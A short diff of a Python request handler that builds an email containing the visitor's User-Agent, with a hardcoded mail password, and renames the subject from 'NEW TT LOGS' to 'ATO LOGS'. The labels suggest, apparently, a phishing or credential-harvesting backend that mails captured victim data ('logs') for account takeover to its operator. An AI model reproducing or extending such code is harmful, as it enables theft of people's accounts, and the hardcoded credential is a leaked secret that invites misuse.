@@ -151,7 +151,7 @@ def first():
         password = "vip79d01760b097"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW TT LOGS"
+        message["Subject"] = "ATO LOGS"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
